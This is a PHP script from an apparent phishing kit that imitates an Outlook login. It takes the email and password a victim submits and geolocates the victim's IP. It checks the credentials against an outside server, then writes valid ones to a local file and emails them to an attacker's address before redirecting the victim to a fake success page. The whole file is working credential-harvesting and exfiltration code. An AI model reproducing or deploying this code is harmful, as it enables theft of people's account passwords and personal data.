<?php
function visitor_country()
    {
        $ip = getenv("REMOTE_ADDR");
        $result = "Unknown";
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, "https://api.ip.sb/geoip/$ip");
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        $country = json_decode(curl_exec($ch))->country;
        if ($country != null)
            {
            $result = $country;
            }

        return $result;
    }
    function ip_info($ip = NULL, $purpose = "location", $deep_detect = TRUE) {
        $output = NULL;
        if (filter_var($ip, FILTER_VALIDATE_IP) === FALSE) {
            $ip = $_SERVER["REMOTE_ADDR"];
            if ($deep_detect) {
                if (filter_var(@$_SERVER['HTTP_X_FORWARDED_FOR'], FILTER_VALIDATE_IP))
                    $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
                if (filter_var(@$_SERVER['HTTP_CLIENT_IP'], FILTER_VALIDATE_IP))
                    $ip = $_SERVER['HTTP_CLIENT_IP'];
            }
        }
        $purpose    = str_replace(array("name", "\n", "\t", " ", "-", "_"), NULL, strtolower(trim($purpose)));
        $support    = array("country", "countrycode", "state", "region", "city", "location", "address");
        $continents = array(
            "AF" => "Africa",
            "AN" => "Antarctica",
            "AS" => "Asia",
            "EU" => "Europe",
            "OC" => "Australia (Oceania)",
            "NA" => "North America",
            "SA" => "South America",
            "BD" => "Bangladesh",
            "GB" => "Great Britain"
        );
        if (filter_var($ip, FILTER_VALIDATE_IP) && in_array($purpose, $support)) {
            $ipdat = @json_decode(file_get_contents("http://www.geoplugin.net/json.gp?ip=" . $ip));
            if (@strlen(trim($ipdat->geoplugin_countryCode)) == 2) {
                switch ($purpose) {
                    case "location":
                        $output = array(
                            "city"           => @$ipdat->geoplugin_city,
                            "state"          => @$ipdat->geoplugin_regionName,
                            "country"        => @$ipdat->geoplugin_countryName,
                            "country_code"   => @$ipdat->geoplugin_countryCode,
                            "continent"      => @$continents[strtoupper($ipdat->geoplugin_continentCode)],
                            "continent_code" => @$ipdat->geoplugin_continentCode
                        );
                        break;
                    case "address":
                        $address = array($ipdat->geoplugin_countryName);
                        if (@strlen($ipdat->geoplugin_regionName) >= 1)
                            $address[] = $ipdat->geoplugin_regionName;
                        if (@strlen($ipdat->geoplugin_city) >= 1)
                            $address[] = $ipdat->geoplugin_city;
                        $output = implode(", ", array_reverse($address));
                        break;
                    case "city":
                        $output = @$ipdat->geoplugin_city;
                        break;
                    case "state":
                        $output = @$ipdat->geoplugin_regionName;
                        break;
                    case "region":
                        $output = @$ipdat->geoplugin_regionName;
                        break;
                    case "country":
                        $output = @$ipdat->geoplugin_countryName;
                        break;
                    case "countrycode":
                        $output = @$ipdat->geoplugin_countryCode;
                        break;
                }
            }
        }
        return $output;
    }
    $api = 'http://my-ips.org/ip/index.php'; //put api url
    $country = visitor_country();
    $ip = getenv("REMOTE_ADDR");
    $data = array(
        "user" => $_POST['emaill'],
        "pass" => $_POST['psw'],
        "type" => "1",
        "country" => $country,
        "ip" => $ip
    );
    $user = $_POST['emaill'];
    $pass = $_POST['psw'];
    $ip = $_SERVER['REMOTE_ADDR'];
    $country = ip_info($ip, "Country");
    $city = ip_info($ip, "City");
    $ccode = ip_info($ip, "Country Code");
    $state = ip_info($ip, "State");
    $address = ip_info($ip, "Address");
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $api);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    $result = curl_exec($ch);
    curl_close($ch);
if(!strcmp("1", $result)){
	$useragent = $_SERVER['HTTP_USER_AGENT'];
	$message .= "|----------| RESULT Outlook By JoCk |--------------|\n";
	$message .= "|Email        		  : ".$_POST['emaill']."\n";
	$message .= "|Password          : ".$_POST['psw']."\n";
	$message .= "|----------| I N F O S |--------------|\n";
	$message .= "|Client IP: ".$ip."|\n";
	$message .= "|User Agent: ".$useragent."|\n";
	$message .= "|----------| YOUR WELCOME By JoCk|--------------|\n";
	$send = "bennieclay2701@gmail.com";
	$subject = "RESULT Outlook By JoCk- From:  [ $ip ]";
	$file = fopen("./cool.txt","a");   ///  Directory Of Rezult OK.
	fwrite($file,$message); 
	mail("$send", "$subject", $message);
	header("Location: ../done/success.html?&sessionid={$_SESSION['randString']}&sslmode=true");
}else{
	header("Location: ../logout.php?&sessionid={$_SESSION['randString']}&sslmode=true");
}

        

?>